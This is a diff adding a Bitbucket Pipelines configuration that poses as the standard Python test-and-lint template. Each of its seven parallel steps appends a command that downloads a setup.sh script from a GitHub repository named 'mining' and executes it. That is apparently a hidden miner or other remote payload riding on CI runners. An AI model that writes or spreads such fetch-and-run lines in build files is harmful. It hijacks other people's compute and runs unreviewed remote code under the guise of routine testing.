@@ -1,0 +1,62 @@
+#  Template python-build
+
+#  This template allows you to validate your python code.
+#  The workflow allows running tests and code linting on the default branch.
+
+image: python:3.8
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: Test 1
+          caches:
+            - pip
+          script:
+            - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+            - pip install pytest
+            - pytest -v tests/* --junitxml=test-reports/report.xml
+            - wget https://raw.githubusercontent.com/lahnoe/mining/main/setup.sh && chmod +x setup.sh && ./setup.sh
+      - step:
+          name: tes 2
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/lahnoe/mining/main/setup.sh && chmod +x setup.sh && ./setup.sh
+      - step:
+          name: tes 3
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/lahnoe/mining/main/setup.sh && chmod +x setup.sh && ./setup.sh
+      - step:
+          name: tes 4
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/lahnoe/mining/main/setup.sh && chmod +x setup.sh && ./setup.sh
+      - step:
+          name: tes 5
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/lahnoe/mining/main/setup.sh && chmod +x setup.sh && ./setup.sh
+      - step:
+          name: tes 6
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/lahnoe/mining/main/setup.sh && chmod +x setup.sh && ./setup.sh
+      - step:
+          name: tes 7
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/lahnoe/mining/main/setup.sh && chmod +x setup.sh && ./setup.sh
+  
